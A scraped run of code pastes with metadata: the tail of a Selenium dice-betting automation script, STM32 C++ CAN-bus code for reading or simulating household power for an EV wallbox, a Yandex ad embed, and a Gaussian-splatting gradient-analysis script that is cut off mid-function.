    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
xBBTmCHi,Enelion Stylo Energy Guard,josefkyrian,C++,Monday 13th of May 2024 05:24:07 AM CDT,"#include <assert.h>

/******************************************************************************
************************ CANBUS FUNCTIONS START *******************************
******************************************************************************/ 
#define STM32_CAN_TIR_TXRQ              (1U << 0U)  // Bit 0: Transmit Mailbox Request
#define STM32_CAN_RIR_RTR               (1U << 1U)  // Bit 1: Remote Transmission Request
#define STM32_CAN_RIR_IDE               (1U << 2U)  // Bit 2: Identifier Extension
#define STM32_CAN_TIR_RTR               (1U << 1U)  // Bit 1: Remote Transmission Request
#define STM32_CAN_TIR_IDE               (1U << 2U)  // Bit 2: Identifier Extension

#define CAN_EXT_ID_MASK                 0x1FFFFFFFU
#define CAN_STD_ID_MASK                 0x000007FFU

/* Symbolic names for formats of CAN message                                 */
typedef enum {STANDARD_FORMAT = 0, EXTENDED_FORMAT} CAN_FORMAT;

/* Symbolic names for type of CAN message                                    */
typedef enum {DATA_FRAME = 0, REMOTE_FRAME}         CAN_FRAME;


typedef struct
{
	uint32_t id;        /* 29 bit identifier                               */
	uint8_t  data[8];   /* Data field                                      */
	uint8_t  len;       /* Length of data field in bytes                   */
	uint8_t  ch;        /* Object channel(Not use)                         */
	uint8_t  format;    /* 0 - STANDARD, 1- EXTENDED IDENTIFIER            */
	uint8_t  type;      /* 0 - DATA FRAME, 1 - REMOTE FRAME                */
} CAN_msg_t;

typedef struct
{
		uint16_t baud_rate_prescaler;                /// [1 to 1024]
		uint8_t time_segment_1;                      /// [1 to 16]
		uint8_t time_segment_2;                      /// [1 to 8]
		uint8_t resynchronization_jump_width;        /// [1 to 4] (recommended value is 1)
} CAN_bit_timing_config_t;


/**
 * Initializes the CAN filter registers.
 *
 * @preconditions   - This register can be written only when the filter initialization mode is set (FINIT=1) in the CAN_FMR register.
 * @params: index   - Specified filter index. index 27:14 are available in connectivity line devices only.
 * @params: scale   - Select filter scale.
 *                    0: Dual 16-bit scale configuration
 *                    1: Single 32-bit scale configuration
 * @params: mode    - Select filter mode.
 *                    0: Two 32-bit registers of filter bank x are in Identifier Mask mode
 *                    1: Two 32-bit registers of filter bank x are in Identifier List mode
 * @params: fifo    - Select filter assigned.
 *                    0: Filter assigned to FIFO 0
 *                    1: Filter assigned to FIFO 1
 * @params: bank1   - Filter bank register 1
 * @params: bank2   - Filter bank register 2
 *
 */
void CANSetFilter(uint8_t index, uint8_t scale, uint8_t mode, uint8_t fifo, uint32_t bank1, uint32_t bank2) {
	if (index > 27) return;

	CAN1->FA1R &= ~(0x1UL<<index);               // Deactivate filter

	if (scale == 0) {
		CAN1->FS1R &= ~(0x1UL<<index);             // Set filter to Dual 16-bit scale configuration
	} else {
		CAN1->FS1R |= (0x1UL<<index);              // Set filter to single 32 bit configuration
	}
		if (mode == 0) {
		CAN1->FM1R &= ~(0x1UL<<index);             // Set filter to Mask mode
	} else {
		CAN1->FM1R |= (0x1UL<<index);              // Set filter to List mode
	}

	if (fifo == 0) {
		CAN1->FFA1R &= ~(0x1UL<<index);            // Set filter assigned to FIFO 0
	} else {
		CAN1->FFA1R |= (0x1UL<<index);             // Set filter assigned to FIFO 1
	}

	CAN1->sFilterRegister[index].FR1 = bank1;    // Set filter bank registers1
	CAN1->sFilterRegister[index].FR2 = bank2;    // Set filter bank registers2

	CAN1->FA1R |= (0x1UL<<index);                // Activate filter

}

/**
 * Initializes the CAN controller with specified bit rate.
 *
 * @params: timings - Specified timings
 * @params: remap   - Select CAN port. 
 *                    =0:CAN_RX mapped to PA11, CAN_TX mapped to PA12
 *                    =1:Not used
 *                    =2:CAN_RX mapped to PB8, CAN_TX mapped to PB9 (not available on 36-pin package)
 *                    =3:CAN_RX mapped to PD0, CAN_TX mapped to PD1 (available on 100-pin and 144-pin package)
 *
 */
bool CANInit(CAN_bit_timing_config_t &timings, int remap)
{
	// Reference manual
	// https://www.st.com/content/ccc/resource/technical/document/reference_manual/59/b9/ba/7f/11/af/43/d5/CD00171190.pdf/files/CD00171190.pdf/jcr:content/translations/en.CD00171190.pdf

	RCC->APB1ENR |= 0x2000000UL;       // Enable CAN clock 
	RCC->APB2ENR |= 0x1UL;             // Enable AFIO clock
	AFIO->MAPR   &= 0xFFFF9FFF;        // reset CAN remap
																		// CAN_RX mapped to PA11, CAN_TX mapped to PA12

	if (remap == 0) {
		RCC->APB2ENR |= 0x4UL;           // Enable GPIOA clock
		GPIOA->CRH   &= ~(0xFF000UL);    // Configure PA12(0b0000) and PA11(0b0000)
																		// 0b0000
																		//   MODE=00(Input mode)
																		//   CNF=00(Analog mode)

		GPIOA->CRH   |= 0xB8FFFUL;       // Configure PA12(0b1011) and PA11(0b1000)
																		// 0b1011
																		//   MODE=11(Output mode, max speed 50 MHz) 
																		//   CNF=10(Alternate function output Push-pull
																		// 0b1000
																		//   MODE=00(Input mode)
																		//   CNF=10(Input with pull-up / pull-down)
																		
		GPIOA->ODR |= 0x1UL << 12;       // PA12 Upll-up
		
	}
																
	if (remap == 2) {
		AFIO->MAPR   |= 0x00004000;      // set CAN remap
																		// CAN_RX mapped to PB8, CAN_TX mapped to PB9 (not available on 36-pin package)

		RCC->APB2ENR |= 0x8UL;           // Enable GPIOB clock
		GPIOB->CRH   &= ~(0xFFUL);       // Configure PB9(0b0000) and PB8(0b0000)
																		// 0b0000
																		//   MODE=00(Input mode)
																		//   CNF=00(Analog mode)

		GPIOB->CRH   |= 0xB8UL;          // Configure PB9(0b1011) and PB8(0b1000)
																		// 0b1011
																		//   MODE=11(Output mode, max speed 50 MHz) 
																		//   CNF=10(Alternate function output Push-pull
																		// 0b1000
																		//   MODE=00(Input mode)
																		//   CNF=10(Input with pull-up / pull-down)
																		
		GPIOB->ODR |= 0x1UL << 8;        // PB8 Upll-up
	}
	
	if (remap == 3) {
		AFIO->MAPR   |= 0x00005000;      // set CAN remap
																		// CAN_RX mapped to PD0, CAN_TX mapped to PD1 (available on 100-pin and 144-pin package)

		RCC->APB2ENR |= 0x20UL;          // Enable GPIOD clock
		GPIOD->CRL   &= ~(0xFFUL);       // Configure PD1(0b0000) and PD0(0b0000)
																		// 0b0000
																		//   MODE=00(Input mode)
																		//   CNF=00(Analog mode)

		GPIOD->CRH   |= 0xB8UL;          // Configure PD1(0b1011) and PD0(0b1000)
																		// 0b1000
																		//   MODE=00(Input mode)
																		//   CNF=10(Input with pull-up / pull-down)
																		// 0b1011
																		//   MODE=11(Output mode, max speed 50 MHz) 
																		//   CNF=10(Alternate function output Push-pull
																		
		GPIOD->ODR |= 0x1UL << 0;        // PD0 Upll-up
	}

	CAN1->MCR |= 0x1UL;                   // Require CAN1 to Initialization mode 
	while (!(CAN1->MSR & 0x1UL));         // Wait for Initialization mode

	//CAN1->MCR = 0x51UL;                 // Hardware initialization(No automatic retransmission)
	CAN1->MCR = 0x41UL;                   // Hardware initialization(With automatic retransmission)
	
	// Set bit timing register 
	CAN1->BTR = (((timings.resynchronization_jump_width - 1U) &    3U) << 24U) |
							(((timings.time_segment_1 - 1U)               &   15U) << 16U) |
							(((timings.time_segment_2 - 1U)               &    7U) << 20U) |
							((timings.baud_rate_prescaler - 1U)           & 1023U);

	// Configure Filters to default values
	CAN1->FMR  |=   0x1UL;                // Set to filter initialization mode
	CAN1->FMR  &= 0xFFFFC0FF;             // Clear CAN2 start bank

	// bxCAN has 28 filters.
	// These filters are shared by both CAN1 and CAN2.
	// STM32F103 has only CAN1, so all 28 are used for CAN1
	CAN1->FMR  |= 0x1C << 8;              // Assign all filters to CAN1

	// Set fileter 0
	// Single 32-bit scale configuration 
	// Two 32-bit registers of filter bank x are in Identifier Mask mode
	// Filter assigned to FIFO 0 
	// Filter bank register to all 0
	CANSetFilter(0, 1, 0, 0, 0x0UL, 0x0UL); 
	
	CAN1->FMR   &= ~(0x1UL);              // Deactivate initialization mode

	uint16_t TimeoutMilliseconds = 1000;
	bool can1 = false;
	CAN1->MCR   &= ~(0x1UL);              // Require CAN1 to normal mode 

	// Wait for normal mode
	// If the connection is not correct, it will not return to normal mode.
	for (uint16_t wait_ack = 0; wait_ack < TimeoutMilliseconds; wait_ack++) {
		if ((CAN1->MSR & 0x1UL) == 0) {
			can1 = true;
			break;
		}
		delayMicroseconds(1000);
	}
	//Serial.print(""can1="");
	//Serial.println(can1);
	if (can1) {
		Serial.println(""CAN1 initialize ok"");
	} else {
		Serial.println(""CAN1 initialize fail!!"");
		return false;
	}
	return true; 
}

/**
 * Decodes CAN messages from the data registers and populates a 
 * CAN message struct with the data fields.
 * 
 * @preconditions A valid CAN message is received
 * @params CAN_rx_msg - CAN message structure for reception
 * 
 */
void CANReceive(CAN_msg_t* CAN_rx_msg)
{
	uint32_t id = CAN1->sFIFOMailBox[0].RIR;
	if ((id & STM32_CAN_RIR_IDE) == 0) { // Standard frame format
			CAN_rx_msg->format = STANDARD_FORMAT;;
			CAN_rx_msg->id = (CAN_STD_ID_MASK & (id >> 21U));
	} 
	else {                               // Extended frame format
			CAN_rx_msg->format = EXTENDED_FORMAT;;
			CAN_rx_msg->id = (CAN_EXT_ID_MASK & (id >> 3U));
	}

	if ((id & STM32_CAN_RIR_RTR) == 0) { // Data frame
			CAN_rx_msg->type = DATA_FRAME;
	}
	else {                               // Remote frame
			CAN_rx_msg->type = REMOTE_FRAME;
	}

	
	CAN_rx_msg->len = (CAN1->sFIFOMailBox[0].RDTR) & 0xFUL;
	
	CAN_rx_msg->data[0] = 0xFFUL &  CAN1->sFIFOMailBox[0].RDLR;
	CAN_rx_msg->data[1] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDLR >> 8);
	CAN_rx_msg->data[2] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDLR >> 16);
	CAN_rx_msg->data[3] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDLR >> 24);
	CAN_rx_msg->data[4] = 0xFFUL &  CAN1->sFIFOMailBox[0].RDHR;
	CAN_rx_msg->data[5] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDHR >> 8);
	CAN_rx_msg->data[6] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDHR >> 16);
	CAN_rx_msg->data[7] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDHR >> 24);

	// Release FIFO 0 output mailbox.
	// Make the next incoming message available.
	CAN1->RF0R |= 0x20UL;
}

/**
 * Encodes CAN messages using the CAN message struct and populates the 
 * data registers with the sent.
 * 
 * @params CAN_tx_msg - CAN message structure for transmission
 * 
 */
void CANSend(CAN_msg_t* CAN_tx_msg)
{
	volatile int count = 0;

	uint32_t out = 0;
	if (CAN_tx_msg->format == EXTENDED_FORMAT) { // Extended frame format
			out = ((CAN_tx_msg->id & CAN_EXT_ID_MASK) << 3U) | STM32_CAN_TIR_IDE;
	}
	else {                                       // Standard frame format
			out = ((CAN_tx_msg->id & CAN_STD_ID_MASK) << 21U);
	}

	// Remote frame
	if (CAN_tx_msg->type == REMOTE_FRAME) {
			out |= STM32_CAN_TIR_RTR;
	}

	CAN1->sTxMailBox[0].TDTR &= ~(0xF);
	CAN1->sTxMailBox[0].TDTR |= CAN_tx_msg->len & 0xFUL;
	
	CAN1->sTxMailBox[0].TDLR  = (((uint32_t) CAN_tx_msg->data[3] << 24) |
															((uint32_t) CAN_tx_msg->data[2] << 16) |
															((uint32_t) CAN_tx_msg->data[1] <<  8) |
															((uint32_t) CAN_tx_msg->data[0]      ));
	CAN1->sTxMailBox[0].TDHR  = (((uint32_t) CAN_tx_msg->data[7] << 24) |
															((uint32_t) CAN_tx_msg->data[6] << 16) |
															((uint32_t) CAN_tx_msg->data[5] <<  8) |
															((uint32_t) CAN_tx_msg->data[4]      ));

	// Send Go
	CAN1->sTxMailBox[0].TIR = out | STM32_CAN_TIR_TXRQ;

	// Wait until the mailbox is empty
	while(CAN1->sTxMailBox[0].TIR & 0x1UL && count++ < 1000000);

	// The mailbox don't becomes empty while loop
	if (CAN1->sTxMailBox[0].TIR & 0x1UL) {
		Serial.println(""Send Fail"");
		Serial.print("" CAN1->ESR "");Serial.print(CAN1->ESR);
		Serial.print("" CAN1->MSR "");Serial.print(CAN1->MSR);
		Serial.print("" CAN1->TSR "");Serial.print(CAN1->TSR);
		Serial.println();
		if (CAN1->TSR & CAN_TSR_RQCP0) {Serial.println("" ERR CAN_TSR_RQCP0"");}
		if (CAN1->TSR & CAN_TSR_TXOK0) {Serial.println("" ERR CAN_TSR_TXOK0"");}
		if (CAN1->TSR & CAN_TSR_ALST0) {Serial.println("" ERR CAN_TSR_ALST0"");}
		if (CAN1->TSR & CAN_TSR_TERR0) {Serial.println("" ERR CAN_TSR_TERR0"");}
		if (CAN1->TSR & CAN_TSR_ABRQ0) {Serial.println("" ERR CAN_TSR_ABRQ0"");}
		if (CAN1->TSR & CAN_TSR_RQCP1) {Serial.println("" ERR CAN_TSR_RQCP1"");}
		if (CAN1->TSR & CAN_TSR_TXOK1) {Serial.println("" ERR CAN_TSR_TXOK1"");}
		if (CAN1->TSR & CAN_TSR_ALST1) {Serial.println("" ERR CAN_TSR_ALST1"");}
		if (CAN1->TSR & CAN_TSR_TERR1) {Serial.println("" ERR CAN_TSR_TERR1"");}
		if (CAN1->TSR & CAN_TSR_ABRQ1) {Serial.println("" ERR CAN_TSR_ABRQ1"");}
		if (CAN1->TSR & CAN_TSR_RQCP2) {Serial.println("" ERR CAN_TSR_RQCP2"");}
		if (CAN1->TSR & CAN_TSR_TXOK2) {Serial.println("" ERR CAN_TSR_TXOK2"");}
		if (CAN1->TSR & CAN_TSR_ALST2) {Serial.println("" ERR CAN_TSR_ALST2"");}
		if (CAN1->TSR & CAN_TSR_TERR2) {Serial.println("" ERR CAN_TSR_TERR2"");}
		if (CAN1->TSR & CAN_TSR_ABRQ2) {Serial.println("" ERR CAN_TSR_ABRQ2"");}
		if (CAN1->TSR & CAN_TSR_CODE) {Serial.println("" ERR CAN_TSR_CODE"");}
		if (CAN1->TSR & CAN_TSR_TME) {Serial.println("" ERR CAN_TSR_TME"");}
		if (CAN1->TSR & CAN_TSR_TME0) {Serial.println("" ERR CAN_TSR_TME0"");}
		if (CAN1->TSR & CAN_TSR_TME1) {Serial.println("" ERR CAN_TSR_TME1"");}
		if (CAN1->TSR & CAN_TSR_TME2) {Serial.println("" ERR CAN_TSR_TME2"");}
		if (CAN1->TSR & CAN_TSR_LOW) {Serial.println("" ERR CAN_TSR_LOW"");}
		if (CAN1->TSR & CAN_TSR_LOW0) {Serial.println("" ERR CAN_TSR_LOW0"");}
		if (CAN1->TSR & CAN_TSR_LOW1) {Serial.println("" ERR CAN_TSR_LOW1"");}
		if (CAN1->TSR & CAN_TSR_LOW2) {Serial.println("" ERR CAN_TSR_LOW2"");}

	}else {
		Serial.println(""Send OK"");
	}
}

/**
 * Returns whether there are CAN messages available.
 *
 * @returns If pending CAN messages are in the CAN controller
 *
 */
uint8_t CANMsgAvail(void)
{
	// Check for pending FIFO 0 messages
	return CAN1->RF0R & 0x3UL;
}
/******************************************************************************
************************ CANBUS FUNCTIONS END *********************************
******************************************************************************/ 


//-------------------------------------------------------------------------------------
//--------------------------- PROGRAM START -------------------------------------------
//-------------------------------------------------------------------------------------
#define INPUT_PIN_POTENTIOMETER      A0
unsigned long previousMillis = 0;
const long interval = 1000;


void readCurrentMode()
{
	CAN_msg_t CAN_RX_msg;

	if(CANMsgAvail()) {
		Serial.println(""Received..."");
		CANReceive(&CAN_RX_msg);

		if (CAN_RX_msg.format == EXTENDED_FORMAT) {
			Serial.print(""Extended ID: 0x"");
			if (CAN_RX_msg.id < 0x10000000) Serial.print(""0"");
			if (CAN_RX_msg.id < 0x1000000) Serial.print(""00"");
			if (CAN_RX_msg.id < 0x100000) Serial.print(""000"");
			if (CAN_RX_msg.id < 0x10000) Serial.print(""0000"");
			Serial.print(CAN_RX_msg.id, HEX);
		} else {
			Serial.print(""Standard ID: 0x"");
			if (CAN_RX_msg.id < 0x100) Serial.print(""0"");
			if (CAN_RX_msg.id < 0x10) Serial.print(""00"");
			Serial.print(CAN_RX_msg.id, HEX);
			Serial.print(""     "");
		}

		Serial.print("" DLC: "");
		Serial.print(CAN_RX_msg.len);
		if (CAN_RX_msg.type == DATA_FRAME) {
			Serial.print("" Data: "");
			for(int i=0; i<CAN_RX_msg.len; i++) {
				Serial.print(""0x""); 
				Serial.print(CAN_RX_msg.data[i], HEX); 
				if (i != (CAN_RX_msg.len-1))  Serial.print("" "");
			}
			Serial.println();

			int16_t c1 = 0, c2 = 0, c3 = 0;
			c1 = CAN_RX_msg.data[0] | (CAN_RX_msg.data[1] << 8);
			c2 = CAN_RX_msg.data[2] | (CAN_RX_msg.data[3] << 8);
			c3 = CAN_RX_msg.data[4] | (CAN_RX_msg.data[5] << 8);
			double L1 = 0, L2 = 0, L3 = 0;
			L1 = ((double)c1 / 10) * 240;
			L2 = ((double)c2 / 10) * 240;
			L3 = ((double)c3 / 10) * 240;
			Serial.print("" C1 "");Serial.print((double)c1 / 10, 1);Serial.print(""A L1 "");Serial.print((double)L1);Serial.println(""W"");
			Serial.print("" C2 "");Serial.print((double)c2 / 10, 1);Serial.print(""A L2 "");Serial.print((double)L2);Serial.println(""W"");
			Serial.print("" C3 "");Serial.print((double)c3 / 10, 1);Serial.print(""A L3 "");Serial.print((double)L3);Serial.println(""W"");
			Serial.println();
		} else {
			Serial.println("" Data: REMOTE REQUEST FRAME"");
		}
	}
}


void wallboxLimitPowerMode()
{
	unsigned long currentMillis = millis();
	if (currentMillis - previousMillis >= interval) {
		previousMillis = currentMillis;
		Serial.println(""\nWallboxLimitPowerMode..."");
		
		int val = analogRead(INPUT_PIN_POTENTIOMETER);
		Serial.print(""  potentiometer: "");Serial.print(val);
		Serial.println();
		double v = (double)val / 1024;
		Serial.print(""  v: "");Serial.print(v, 1);
		Serial.println();

		double current = v * 32; // 32A is max
		Serial.print(""  current: "");Serial.print(current, 1);Serial.print(""A"");
		Serial.println();

		double power = current * 240;
		Serial.print(""  power: "");Serial.print(power, 1);Serial.print(""W"");
		Serial.println();

		int16_t L1 = current * 10, L2 = current * 10, L3 = current * 10;

		CAN_msg_t CAN_TX_msg;

		CAN_TX_msg.type = DATA_FRAME;
		CAN_TX_msg.format = EXTENDED_FORMAT;
		CAN_TX_msg.id = 0x10045400;

		CAN_TX_msg.data[0] = L1 & ((1 << 8) - 1);
		CAN_TX_msg.data[1] = L1 >> 8;
		CAN_TX_msg.data[2] = L2 & ((1 << 8) - 1);
		CAN_TX_msg.data[3] = L2 >> 8;
		CAN_TX_msg.data[4] = L3 & ((1 << 8) - 1);
		CAN_TX_msg.data[5] = L3 >> 8;
		
		CAN_TX_msg.len = 6;
		Serial.println(""  send..."");
		CANSend(&CAN_TX_msg);
	}
}


void setup() {
	Serial.begin(115200);
	Serial.println(""Start"");

	pinMode(INPUT_PIN_POTENTIOMETER, INPUT_ANALOG);

	CAN_bit_timing_config_t timings;
	const uint32_t peripheral_clock_rate = HAL_RCC_GetPCLK1Freq();
	timings.baud_rate_prescaler = 21;
	timings.time_segment_1 = 13;
	timings.time_segment_2 = 2;
	timings.resynchronization_jump_width = 1;

	Serial.print(""peripheral_clock_rate=""); Serial.println(peripheral_clock_rate);

	Serial.print(""timings.baud_rate_prescaler=""); Serial.println(timings.baud_rate_prescaler);
	Serial.print(""timings.time_segment_1=""); Serial.println(timings.time_segment_1);
	Serial.print(""timings.time_segment_2=""); Serial.println(timings.time_segment_2);
	Serial.print(""timings.resynchronization_jump_width=""); Serial.println(timings.resynchronization_jump_width);

	double computed_bitrate = 1 / (1 / (double)peripheral_clock_rate * timings.baud_rate_prescaler * (timings.time_segment_1 + timings.time_segment_2 + timings.resynchronization_jump_width));
	Serial.print(""computed_bitrate=""); Serial.println(computed_bitrate, 3);

	bool ret = CANInit(timings, 2);  // CAN_RX mapped to PB8, CAN_TX mapped to PB9
	if (!ret) while(true);
}


void loop() {
	// (un)comment to change mode

	// read house consumption from power guard device
	readCurrentMode(); // <<<<<<--------------

	// simulate house consumption
	//wallboxLimitPowerMode(); // <<<<<<--------------
}
"
uRjZZBpa,[D] –õ–µ–Ω—Ç–∞ - —Å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–µ–π –∫–æ–ª–æ–Ω–æ–∫,Luxup,JavaScript,Monday 13th of May 2024 05:12:06 AM CDT,"<div id=""yandex_rtb_R-A-2205764-21""></div>
<script>
    window.yaContextCb.push(()=>{
    	Ya.Context.AdvManager.render({
            ""blockId"": ""R-A-2205764-21"",
            ""renderTo"": ""yandex_rtb_R-A-2205764-21"",
            ""type"": ""feed"",
            ""feedCardCount"": 6,
            ""columnCount"": 2
        })
	})
</script>"
afbzc0F8,Untitled,noodleham,Python,Monday 13th of May 2024 05:08:52 AM CDT,"#
# Copyright (C) 2023, Inria
# GRAPHDECO research group, https://team.inria.fr/graphdeco
# All rights reserved.
#
# This software is free for non-commercial, research and evaluation use 
# under the terms of the LICENSE.md file.
#
# For inquiries contact  george.drettakis@inria.fr
#
import copy
import math
import os
import pdb
from collections import defaultdict
from typing import List, Union, Tuple, Dict, Literal
import pprint

import numpy as np
import torch
import random
from random import randint
from utils.loss_utils import l1_loss, ssim
from gaussian_renderer import render, network_gui
import sys
from scene import Scene, GaussianModel
from utils.general_utils import safe_state
import uuid
from tqdm import tqdm
from utils.image_utils import psnr
from argparse import ArgumentParser, Namespace
from arguments import ModelParams, PipelineParams, OptimizationParams

import matplotlib.pyplot as plt
import matplotlib

try:
    from torch.utils.tensorboard import SummaryWriter

    TENSORBOARD_FOUND = True
except ImportError:
    TENSORBOARD_FOUND = False


def get_full_batch_gradients(gaussians: GaussianModel, viewpoint_stack, background, pipe, opt, grad_keys):
    gaussians.optimizer.zero_grad(set_to_none=True)
    for i in range(len(viewpoint_stack)):
        viewpoint_cam = viewpoint_stack[i]
        bg = background
        render_pkg = render(viewpoint_cam, gaussians, pipe, bg)
        image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[""viewspace_points""], \
            render_pkg[""visibility_filter""], render_pkg[""radii""]
        # Loss
        gt_image = viewpoint_cam.original_image.cuda()
        Ll1 = l1_loss(image, gt_image)
        loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
        loss.backward()
    ret = {k: getattr(gaussians, k).grad for k in grad_keys}
    gaussians.optimizer.zero_grad(set_to_none=True)
    return ret


def get_grad_stats(gaussians: GaussianModel, viewpoint_stack, background, pipe, opt, grad_keys,
                   sampling: str = ""random"",
                   accum_steps: int = 1, determininstic_index: int = None,
                   monitor_params: Tuple[str, List[int]] = None) -> Tuple[
    torch.Tensor, Dict[str, np.array], Dict[str, np.array], Dict[str, np.array], Dict[str, np.array]]:
    assert sampling in [""random"", ""random_order_whole"", ""nearby"", """"]
    cam_indices = None

    if determininstic_index is not None:
        cam_indices = list(range(determininstic_index, determininstic_index + accum_steps))
    else:
        if sampling == ""random"":
            cam_indices = [randint(0, len(viewpoint_stack) - 1) for _ in range(accum_steps)]
        elif sampling == 'nearby':
            index = randint(0, len(viewpoint_stack) - accum_steps)
            cam_indices = list(range(index, index + accum_steps))
        elif sampling == ""random_order_whole"":
            assert accum_steps == len(viewpoint_stack)
            cam_indices = np.random.permutation(np.arange(len(viewpoint_stack)))
    grad_running_sum = {k: 0 for k in grad_keys}
    sparsities = {k: [] for k in grad_keys}
    variances = {k: [] for k in grad_keys}
    cosines = {k: [] for k in grad_keys}
    SNRs = {k: [] for k in grad_keys}
    target_grad = get_full_batch_gradients(gaussians, viewpoint_stack, background, pipe, opt, grad_keys)

    gaussians.optimizer.zero_grad(set_to_none=True)
    for i, cam_idx in enumerate(cam_indices):
        viewpoint_cam = viewpoint_stack[cam_idx]
        bg = background
        render_pkg = render(viewpoint_cam, gaussians, pipe, bg)
        image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[""viewspace_points""], \
            render_pkg[""visibility_filter""], render_pkg[""radii""]
        # Loss
        gt_image = viewpoint_cam.original_image.cuda()
        Ll1 = l1_loss(image, gt_image)
        loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
        loss.backward()

        if monitor_params is not None:
            raise NotImplementedError()
        else:
            for k in grad_keys:
                grad_running_sum[k] += getattr(gaussians, k).grad
                sparsities[k].append(float(get_sparsity(grad_running_sum[k])))
                variances[k].append(float(get_variance(grad_running_sum[k], mean=0).mean()))
                cosines[k].append(float(
                    torch.nn.functional.cosine_similarity(grad_running_sum[k].flatten(), target_grad[k].flatten(),
                                                          dim=0)))
                signal = target_grad[k].flatten() / len(cam_indices)
                sample = grad_running_sum[k].flatten() / (i + 1)
                noise = (sample - signal)
                SNRs[k].append(float(torch.inner(signal, signal) / torch.inner(noise, noise)))
        gaussians.optimizer.zero_grad(set_to_none=True)
    sparsities_np = {k: np.array(v) for k, v in sparsities.items()}
    variances_np = {k: np.array(v) for k, v in variances.items()}
    cosines_np = {k: np.array(v) for k, v in cosines.items()}
    SNRs_np = {k: np.array(v) for k, v in SNRs.items()}
    return grad_running_sum, sparsities_np, variances_np, cosines_np, SNRs_np


def get_sparsity(grad: torch.Tensor) -> torch.Tensor:
    return (grad == 0).sum() / grad.numel()


def get_variance(grad: torch.Tensor, mean) -> torch.Tensor:
    return (grad - mean) ** 2


def restored_gaussians(model_params, dataset, opt, deepcopy=False) -> GaussianModel:
    if deepcopy:
        model_params = copy.deepcopy(model_params)
    gaussians = GaussianModel(dataset.sh_degree)
    gaussians.training_setup(opt)
    gaussians.restore(model_params, opt)
    return gaussians


def fill_subplot(ax, title, xs, ys, xlabel, ylabel, xscale='linear', legend_labels: Union[str, List[str]] = """"):
    if isinstance(ys[0], list):
        for i in range(len(ys)):
            if isinstance(xs[0], list):
                ax.plot(xs[i], ys[i], label=legend_labels[i].replace('_', ''), marker='.')
            else:
                ax.plot(xs, ys[i], label=legend_labels[i].replace('_', ''), marker='.')
    else:
        ax.plot(xs, ys, label=legend_labels.replace('_', ''), marker='.')
    ax.set_title(title)
    ax.set_xlabel(xlabel)
    ax.set_xscale(xscale)
    # if xscale == 'log':
    #     ax.set_xticks(xs)
    #     ax.get_xaxis().set_major_formatter(matplotlib.ticker.ScalarFormatter())
    ax.set_ylabel(ylabel)
    if legend_labels != '':
        ax.legend()


def plot_histogram(grads, num_bins=1000):
    counts, bins = torch.histogram(grads, bins=num_bins)
    plt.hist(bins[:-1], bins, weights=counts)
    # plt.yscale('symlog')
    plt.ylim((0, counts.max()))
    plt.show()
    plt.close()


def plot_covariance(cov, to_plot: List[int], sqrt=True):
    if len(to_plot) >= 4:
        nrows, ncols = 2, math.ceil(len(to_plot) / 2)
    else:
        nrows, ncols = 1, len(to_plot)
    fig, axes = plt.subplots(nrows, ncols, figsize=(6 * ncols, 6 * nrows + 2), dpi=200)
    for i, ax in enumerate(fig.axes):
        if i > len(to_plot):
            break
        if sqrt:
            ax.imshow(torch.sqrt(torch.abs(cov[to_plot[i]])), cmap='gray')
            ax.set_title(f'sqrt(covariance) for parameter {to_plot[i]}')
        else:
            ax.imshow(torch.abs(cov[to_plot[i]]), cmap='gray')
            ax.set_title(f'covariance for parameter {to_plot[i]}')
        ax.set_xlabel('view #')
        ax.set_ylabel('view #')
    plt.suptitle('Grad covariance by view')
    plt.show()
    plt.close()


def get_variance_sparsity_cosine_SNR(gaussians, train_cameras, background, pipe, opt, keys, num_trials, accum_steps):
    sparsities = {k: 0 for k in keys}
    variances = {k: 0 for k in keys}
    cosines = {k: 0 for k in keys}
    SNRs = {k: 0 for k in keys}
    for trial in range(num_trials):
        grads_runing_sum, s, v, c, snrs = get_grad_stats(gaussians, train_cameras, background, pipe, opt, keys,
                                                         sampling=""random_order_whole"", accum_steps=accum_steps)
        # grads_runing_sum, s, v, c = get_grad_stats(gaussians, train_cameras, background, pipe, opt, keys,
        #                                         sampling="""", accum_steps=accum_steps, determininstic_index=0)
        for k in keys:
            sparsities[k] += s[k] / num_trials
            variances[k] += v[k] / num_trials
            cosines[k] += c[k] / num_trials
            SNRs[k] += snrs[k] / num_trials
    return variances, sparsities, cosines, SNRs


def plot_variance_sparsity_cosine(dataset, opt, train_cameras, background, pipe, checkpoint, keys, num_trials=32,
                                  iters_list=[15000, 30000]):
    accum_steps = len(train_cameras)
    random.seed()
    variances: List[Dict[str: np.array]] = []
    sparsities: List[Dict[str: np.array]] = []
    cosines: List[Dict[str: np.array]] = []
    SNRs: List[Dict[str: np.array]] = []
    for iter in iters_list:
        chpt = checkpoint.rstrip("".pth"").split(""chkpnt"")[1]
        print('loading checkpoint ', checkpoint.replace(""chkpnt"" + str(chpt), ""chkpnt"" + str(iter)))
        (model_params, first_iter) = torch.load(checkpoint.replace(""chkpnt"" + str(chpt), ""chkpnt"" + str(iter)))
        gaussians = restored_gaussians(model_params, dataset, opt)
        v, s, c, snrs = get_variance_sparsity_cosine_SNR(gaussians, train_cameras, background, pipe, opt, keys,
                                                         num_trials, accum_steps)
        variances.append(v)
        sparsities.append(s)
        cosines.append(c)
        SNRs.append(snrs)

    scene_name = os.path.basename(args.source_path)
    for k in keys:
        fig, ax = plt.subplots(1, 5, figsize=(6 * 5, 6))
        for i, iter in enumerate(iters_list):
            fill_subplot(ax[0], 'Batch size vs Grad Sparsity', np.arange(accum_steps),
                         sparsities[i][k],
                         'Batch size', 'Sparsity', xscale='log', legend_labels='iter ' + str(iter))
